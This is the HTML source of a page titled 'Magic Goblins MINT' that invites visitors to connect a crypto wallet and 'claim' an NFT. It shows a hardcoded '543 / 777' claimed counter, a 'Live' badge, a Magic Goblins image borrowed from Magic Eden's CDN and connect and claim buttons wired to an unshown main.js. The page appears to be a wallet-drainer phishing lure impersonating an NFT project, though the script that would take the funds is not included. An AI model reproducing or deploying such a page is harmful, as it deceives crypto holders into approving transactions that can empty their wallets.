<html class="light" style="color-scheme: light;" ml-update="aware">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>Magic Goblins MINT</title>
    <link rel="stylesheet" href="css1.css" data-n-g="">
    <link rel="stylesheet" href="css2.css">
    <link href="css2" rel="stylesheet">
    <link href="css3" rel="stylesheet">
    <link rel="stylesheet" href="all.min.css">
</head>

<body onload="start()">
    <div class="wrapper">
        <div class="main-area">
            <div class="main-area__left">
                <div class="slider-area _ibj">
                    <figure>
                        <img src="https://kartinkin.net/uploads/posts/2021-10/1633777816_33-kartinkin-net-p-monetka-piksel-art-krasivo-49.png" alt="Jpg">
                    </figure>
                </div>
            </div>
            <div class="main-area__right">
                <br>
                <br>
                <br>
                <h2 class="right-title">
                    <center>
                        <div
                            style="background: linear-gradient(to right, #01edff, #fece00, #fe3c00);background-size: 8000% 100%;border-radius: 500px;animation: gradient 5s ease infinite;">
                            <img src="https://img-cdn.magiceden.dev/rs:fill:640:640:0:0/plain/https://creator-hub-prod.s3.us-east-2.amazonaws.com/magic_goblins_pfp_1684299881851.gif">
                        </div>
                        <style>
                            @keyframes gradient {
                                200% {
                                    background-position: 500% 50%;
                                }

                                50% {
                                    background-position: 100% 60%;
                                }

                                100% {
                                    background-position: 10 0% 50%;
                                }
                            }
                        </style>
                    </center>
                </h2>
                <br>
                <div class="right-list">
                    <div>
                        <div class="text">Claim your nft effortlessly with our user-friendly platform. Whether you're a token holder or a participant in a token sale, we've got you covered. Our streamlined process ensures a smooth and secure nft claim experience.</span>.</div>
                    </div>
                </div>
                <br>
                <div class="price">
                    <div class="price-list">
                        <li>
                            <div class="text">Claimning</div>
                            <div class="number">
                                <div class="token-number" id="tokenup">
                                    <span id="tokennumber">543</span>&nbsp;&nbsp;&#47;&nbsp;<span id="endTick">777
                                        </span>
                                </div>
                            </div>
                        </li>
                        <li>
                            <div class="text">Public</div>
                            <div class="number">Mint</div>
                        </li>
                        <li>
                            <div class="live">Live</div>
                        </li>
                    </div>
                    <div id="root">
                        <div class="slsl">
                            <center>
                                <button id="connectButton" onclick="connect()" style="width: 300px"
                                    class="wallet-adapter-button wallet-btn" tabindex="0"
                                    type="button">Loading...</button>
                            </center>
                            <span id="mintSpan" style="display: none">
                                <button id="mintButton" onclick="claim()" class="wallet-adapter-button wallet-btn"
                                    tabindex="0" type="button">Mint</button></span>
                        </div>
                    </div>
                </div>
                <br>
                <br>
                <a href="https://birdeye.so/token/9noXzpXnkyEcKF3AeXqUHTdR59V5uvrRBUZ9bwfQwxeq" target="_blank"><img src="birdeye.png" style="width: 300px"></a>
            </div>
        </div>
    </div>
    <script src="main.js"></script>
</body>

</html>
